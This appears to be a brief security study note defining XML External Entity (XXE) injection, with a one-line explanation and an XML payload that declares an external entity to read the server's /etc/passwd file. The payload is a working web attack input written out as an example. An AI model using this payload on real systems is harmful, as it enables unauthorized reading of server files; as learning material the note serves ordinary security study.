---
tags:
  - security
  - web
aliases:
  - XML Injection
  - XXE
---
A web exploitation that involves creating XML for the website to transfer server-side files using the include entity feature.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```